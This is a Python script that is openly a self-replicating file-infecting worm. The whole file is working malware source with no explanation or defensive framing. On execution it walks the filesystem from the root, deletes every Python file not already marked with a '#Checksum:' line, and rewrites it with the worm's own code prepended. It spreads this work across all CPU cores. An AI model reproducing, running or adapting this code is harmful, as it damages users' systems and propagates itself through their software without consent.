#Worm:Start
import os
import sys
import hashlib
import re
import multiprocessing

def get_md5(word):
    return hashlib.md5(bytes(word, 'utf-8')).hexdigest()

def get_worm_code():
    worm = sys.argv[0]
    file = open(worm,'r')
    code = file.read()
    x = re.findall(r'#Worm:Start(.*)#Worm:End', code, re.DOTALL)
    return x

def infect(start,end,files_to_infect):
    for i in range(start,end):
        old_file_lines = open(files_to_infect[i], 'r').readlines()
        os.remove(files_to_infect[i])

        new_file = open(files_to_infect[i], 'w+')
        new_file.write("#Checksum: " + get_md5(files_to_infect[i]) + '\n')

        code = get_worm_code()
        new_file.write("#Worm:Start")
        for line in code:
            new_file.write(line)
        new_file.write('\n')

        new_file.write("#Worm:End\n")

        for line in old_file_lines:
            new_file.write(line)
        new_file.write('\n')

        new_file.flush()
        new_file.close()

def execute():
    files_to_infect = list()
    for root, dirs, files in os.walk("/"):
        for file_name in files:
            if file_name.endswith(".py"):
                file_path = os.path.join(root, file_name)
                first_line = open(file_path, 'r').readline()
                if len(first_line ) > 0:
                    if first_line.startswith("#Checksum:"):
                        continue
                files_to_infect.append(file_path)
    cpu_cores = multiprocessing.cpu_count()
    size_of_group = len(files_to_infect) // cpu_cores

    if size_of_group is 0:
        size_of_group = len(files_to_infect)
        cpu_cores = 1

    processes = []
    for i in range(0,cpu_cores):
        task = multiprocessing.Process(target=infect, args=(i*size_of_group,(i+1)*size_of_group,files_to_infect))
        processes.append(task)
        task.start()

    for one_process in processes:
        one_process.join()

execute()
#Worm:End
